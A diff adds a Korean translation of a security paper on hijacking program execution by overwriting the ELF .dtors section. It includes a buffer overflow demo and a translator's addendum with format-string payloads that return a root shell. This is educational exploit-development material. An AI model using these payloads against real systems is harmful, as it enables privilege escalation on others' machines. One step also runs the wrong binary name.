@@ -1,0 +1,374 @@
+------------------------------------------------------------------------------
+
+               프로그램 실행 변경을 위해 .dtors영역 덮어 쓰기
+     (원제: Overwriting ELF .dtors section to modify program execution) 
+
+                            작성: Guido Bakker < guidob@synnergy.net > 
+                            번역: willy in Null@Root < jeazon@hanmail.net >
+
+
+-------------------------------------------------------------------------------
+
+소 개 
+------
+이 자료는 gcc와 함께 컴퍼일되어진 C프로그램의 실행 흐름을 조절할 수 있는 기술에 
+대해 간결하게 설명을 한다. 이 문서를 이해하기 위해서는 일반적인 overflow에 대한 
+기술적인 방법와 ELF포멧에 대하여 알고 있어야 한다.
+
+
+감 사 
+------
+관심있는 협의를 해준 ga 와 dvorak에게 감사
+
+
+개 요
+------
+gcc는 펑션을 위해 몇가지의 속성 타입을 준비한다. 특별히 우리에게 관심이 있는 
+두개의 속성이 있다. 그것은 constructors와 destructors이다.  이들 속성은 아래와 
+같은 방법으로 프로그래머에 의해 작성되어질수 있다. 
+
+        static void start(void) __attribute__ ((constructor));
+        static void stop(void)  __attribute__ ((destructor));
+
+
+콘스트럭터 속성의 펑션들은 main()전에 실행되고 디스트럭트 속성으로 정의 된것은
+main() 종료후에 실행될 것이다.
+
+만들어진 ELF 실행가능한 이미지 이것은 두개의 다른 영역으로 표현되어질수 있다: 
+.ctors와 .dtors  둘다 아래와 같은 레이아웃을 갖는다. 
+
+    0xffffffff <function address> <another function address> ... 0x00000000
+
+참고: 만약 정말 이것에 대하여 여러가지를 알고 싶다면  gcc-2.95.2/gcc/collect2.c 
+에디터를 실행시키길 바란다.
+          
+
+여기에는 아래와 같은 몇가지 특성이 있다.
+
+  * .ctors와 .dtors는 프로세스 주소 공간 메모리에 기록되어지고 기본적으로 쓰기 
+    가능해질 것이다.
+
+  * 그들 영역은 일반적인 이진 strip(1) 뒤에 멀리 떨어져 있지 않다.  
+
+  * 프로그래머가 콘스트럭터나 디스트럭터 둘중 어느것을 설치했는가에 대하여 신경
+    쓸 필요가 없다. 왜냐면 특별히 정의하지 않아도 두영역은 메모리에 기록되고 
+    어째튼 나타난다.
+
+
+상세 내용
+-----------
+이제 전 단계에 대한 정의를 할 시간인거 같다..          
+
+$ cat > yopta.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+
+static void start(void) __attribute__ ((constructor));
+static void stop(void)  __attribute__ ((destructor));
+
+int
+main(int argc, char *argv[])
+{
+        printf("start == %p\n", start);
+        printf("stop == %p\n", stop);
+
+        exit(EXIT_SUCCESS);
+}
+
+void
+start(void)
+{
+        printf("hello world!\n");
+}
+
+void
+stop(void)
+{
+        printf("goodbye world!\n");
+}
+
+EOF
+$ gcc -o yopta yopta.c
+$ ./yopta
+hello world!
+start == 0x8048480
+stop == 0x80484a0
+goodbye world!
+$ objdump -h yopta
+                                       .
+                                       .
+                                       .
+14 .data         0000000c  08049558  08049558  00000558  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+15 .eh_frame     00000004  08049564  08049564  00000564  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+16 .ctors        0000000c  08049568  08049568  00000568  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+17 .dtors        0000000c  08049574  08049574  00000574  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+18 .got          00000024  08049580  08049580  00000580  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+                                       .
+                                       .
+                                       .
+$ objdump -s -j .dtors yopta
+
+yopta:     file format elf32-i386
+
+Contents of section .dtors:
+8049574 ffffffff a0840408 00000000           ............
+
+우리가 볼수 있었덨던 같이 전에 애기한것 처럼 stop()주소는 .dtors에 저장되어졌
+다. 우리는 프로그램을 이용하려는데 목적이 있기에 여기에 유용하지 않은 .ctors에 
+대해서는 잊기로 하자.
+
+그럼 위와 같은 함수 속성이 없는 일반적인 프로그램을 가지고 시도해 보자.
+
+$ cat > bleh.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+static void bleh(void);
+
+int
+main(int argc, char *argv[])
+{
+        static u_char buf[] = "bleh";
+
+        if (argc < 2)
+                exit(EXIT_FAILURE);
+
+        strcpy(buf, argv[1]);
+
+        exit(EXIT_SUCCESS);
+}
+
+void
+bleh(void)
+{
+        printf("goffio!\n");
+}
+EOF
+$ gcc -o bleh bleh.c
+$ ./bleh
+$ objdump -h bleh
+                                       .
+                                       .
+                                       .
+17 .dtors        00000008  0804955c  0804955c  0000055c  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+                                       .
+                                       .
+                                       .
+
+좋아, 디스트러터 나타내는 펑션이 없어도 여전히 .dtors가 있는것을 확인할수 있다.
+지금 이것의 내용을 들여다 보자.
+
+$ objdump -s -j .dtors bleh
+
+bleh:     file format elf32-i386
+
+Contents of section .dtors:
+804955c ffffffff 00000000                    ........
+
+여기에는 앞과 뒤부분의 테그만 있지 펑션의 주소들은 나타나 있지 않다.
+
+위의 예제에서 buf를 스테틱으로 초기화 선언하였다. 이렇게 한 이유는 우리의 목표
+인 .dtors영역 매우 가까이에 있는 .data영역가 있으므로 buf를 이용하여 .dtors영역
+에 특정값을 저장하는 것을 할수 있다. 방법은 buf를 오버플로우 시킴으로서 쉽게 
+우리가 목적을 이룰수 있다.
+
+이것을 이용하면 실제적으로 프로세스주소공간에 쓸수 있는 방법으로 유용하다.
+(포멧스트링 공격, libc ret에 의해 직접적인 스트링카피, 부당한 메모리 할당.)
+
+이제 주어진 (정상적으로 실행/출력할 수 없는) bleh()을 .dtors 엔트리를 만들어서 
+실행 시켜 보자.  우리가 실행시키기 위해서는 앞 테그는 신경쓰지 말고 뒤쪽의 테그
+(0x00000000)을 덮어쓰기 해야 한다.
+
+$ objdump --syms bleh | egrep 'text.*bleh'
+080484b0 l     F .text  0000001a              bleh
+
+bleh()가 0x080484b0에 위치해 있는 것을 볼수있다. 이것을 이용해 보자. 
+
+$ ./bleh `perl -e 'print "A" x 24; print "\xb0\x84\x04\x08";'`
+goffio!
+Segmentation fault (core dumped)
+
+이는 우리가 예상한 대로 실행었만 좀더 구체적으로 내용를 확인하고 프로세스를 
+보고 무엇이 바꿨는지 보자.
+
+$ gdb bleh core
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+Core was generated by `./bleh AAAAAAAAAAAAAAAAAAAAAAAA?                                                      '.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/libc.so.6...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0x40013ed8 in ?? ()
+(gdb) bt
+#0  0x40013ed8 in ?? ()
+#1  0x8048521 in _fini ()
+#2  0x4003c25a in exit (status=0) at exit.c:57
+#3  0x80484a3 in main ()
+#4  0x400339cb in __libc_start_main (main=0x8048460 <main>, argc=2,
+argv=0xbfff
+f8a4, init=0x80482e0 <_init>,
+    fini=0x804850c <_fini>, rtld_fini=0x4000ae60 <_dl_fini>,
+stack_end=0xbffff8
+9c) at ../sysdeps/generic/libc-start.c:92
+(gdb) maintenance info sections
+Exec file:
+    `/home/rwx/tmp/bleh', file type elf32-i386.
+                                       .
+                                       .
+                                       .
+0x0804953c->0x08049550 at 0x0000053c: .data ALLOC LOAD DATA HAS_CONTENTS
+0x08049550->0x08049554 at 0x00000550: .eh_frame ALLOC LOAD DATA HAS_CONTENTS
+0x08049554->0x0804955c at 0x00000554: .ctors ALLOC LOAD DATA HAS_CONTENTS
+0x0804955c->0x08049564 at 0x0000055c: .dtors ALLOC LOAD DATA HAS_CONTENTS
+0x08049564->0x0804958c at 0x00000564: .got ALLOC LOAD DATA HAS_CONTENTS
+                                       .
+                                       .
+                                       .
+
+여기서 무엇이 덮어쒸워졌는지 조사하자.
+
+(gdb) x/x 0x08049550
+0x8049550 <force_to_data>:      0x41414141
+
+이것들은 .eh_frame의 내용들이다. (언어의 핸들러포인터을 제외한 저장을 위해 
+gcc가 사용되었다.)
+
+(gdb) x/x 0x08049554
+0x8049554 <__CTOR_LIST__>:      0x41414141
+(gdb) x/8x 0x0804955c
+0x804955c <__DTOR_LIST__>:      0x41414141      0x080484b0      0x08049500
+                                0x40013ed0
+0x804956c <_GLOBAL_OFFSET_TABLE_+8>:    0x4000a960      0x400fb550
+                                        0x08048336      0x400338cc
+(gdb)
+
+우리가 볼수 있었던것처럼 우리는 앞테그(0xffffffff)에 대해서는 신경쓰지 않았다 
+그리고 단지 우리가 원하는 뒤테그에 bleh()주소를 넣으므로써 그 코드를 실행시킬수
+있었다. 또한 segmenet faults가 발생하는 것을 볼수 있는데 이것은 뒤 테그을 우리
+가 바꾸었서 나타는 문제임을 쉽게 예상할수 있다.
+
+
+결 론 
+------
+주입된 shellcode을 실행시키기 위한 선택적인 방법의 특징들이다. 
+
+장점) 
+
+  1. 만약 목표 실행화일이 공격자에게 읽기 가능하게 되어있다면 쉽게 우리의 
+     shellcode의 주소를 써야할지 정확한 위치를 알수 있다. 그렇지 않아도 단지 
+     ELF 이미지와 .dtors 위치만 알아도 충분하다. 이 장점은 잇스프로잇의 신뢰도
+     를 상당히 높일수 있다.
+
+  2. 이것은 다른 그로벌 옵셋테이블의 엔트리를 덮어쓰기 하는 것과 같은 기술에 
+     비해 매우 단순하다.
+
+단점) 
+
+  1. 희생 프로그램은 GNU 툴들로 컴퍼일과 링크가 되어져야 한다. 
+
+  2. 특정상황하에서는 프로그램이 종료되기까지 shellcode가 저장된 장소를 찾기 
+     어려울수 있다.    
+
+Have fun! :)
+
+
+번역자 추가
+-----------
+이 .dtors 덮어쓰기 방법은 Heap overflow에 일부 응용될수 있으나 buffer가 stack
+영역에서 선언되기 때문에 조건을 맞추기가 쉽지 않을 것이라 생각된다. 이 방법은 
+FSB(Format String Bug)에 응용하기에 상당히 좋다. 
+
+FSB에서 ret addr에 shellcode주소를 넣는 방법을 주로 쓰게되는데 대부분의 실행화일
+들이 읽기 금지 퍼미션이 되어있으므로 함수의 ret addr를 찾기가 쉽지 않다. 이렇때
+쉽게 이용할 수 있는 장점이 있다.
+
+또 한가지 장점은 함수가 정상적으로 리턴되지 않은 경우, 이런 경우에는 ret addr를 
+공격할수 없는데  이럴때도 이 .dtors덮어쓰기를 쓸수 있다. 
+
+간단히 FSB에 응용해 보자.
+
+[willy@localhost test]$ more t1.c
+main()
+{
+   char buf[100];
+   
+   scanf("%s",buf);
+   printf(buf);
+}
+
+이는 간단한 Format string bug 프로그램이다.
+
+[willy@localhost test]$ cc t1.c -o t1
+[willy@localhost test]$ objdump -s -j .dtors t1
+
+t1:     file format elf32-i386
+
+Contents of section .dtors:
+804948c ffffffff 00000000                    ........        
+
+여기서 .dtors의 주소가 0x0804948c이고 tail tag가 0x08049490인것을 알수 있으므로
+이를 이용하여 간단한 exploit을 만들어 보자. (shellcode는 0xbffff770에 있음)
+
+
+[willy@localhost test]$ (printf "\x41\x41\x41\x41\x90\x94\x04\x08\x41\x41
+\x41\x41\x92\x94\x04\x08%%63328c%%hn%%51343c%%hn";cat) | ./t1
+
+id;
+uid=502(willy) gid=502(willy) euid=0(root) groups=502(willy),1000(webadm)
+[willy@localhost test]$
+
+단번에 공격 주소를 찾을 수 있으므로서 쉽게 exploit을 만들 수 있다.
+
+이번에는 위의 t1.c 소스 끝부분에 exit()를 추가해서 main() 함수가 정상적으로 리턴
+되지 못하게 해보자. 
+
+[willy@localhost test]# more t2.c
+main()
+{
+   char buf[100];
+   
+   scanf("%s",buf);
+   printf(buf);
+   exit();
+}
+[willy@localhost test]$ cc t2.c -o t2
+[willy@localhost test]$ objdump -s -j .dtors t2
+
+t1:     file format elf32-i386
+
+Contents of section .dtors:
+80494cc ffffffff 00000000                    ........        
+
+[willy@localhost test]$ (printf "\x41\x41\x41\x41\xd0\x94\x04\x08\x41\x41
+\x41\x41\xd2\x94\x04\x08%%63328c%%hn%%51343c%%hn";cat) | ./t1
+
+id;
+uid=502(willy) gid=502(willy) euid=0(root) groups=502(willy),1000(webadm)
+[willy@localhost test]$
+
+역시 문제없이 공격할수 있음을 알수 있다.  
+
+.dtors 덮어쓰기 방법을 잘 응용하면 좀더 새로운 공격법들을 개발할수 있을 것으로 
+판단된다. 
+
+
+출처: http://www.synnergy.net/Archives/Papers/rwxrwxrwx/dtors.txt
+      http://www.securityfocus.com/archive/1/150396
+
+
+ 
+
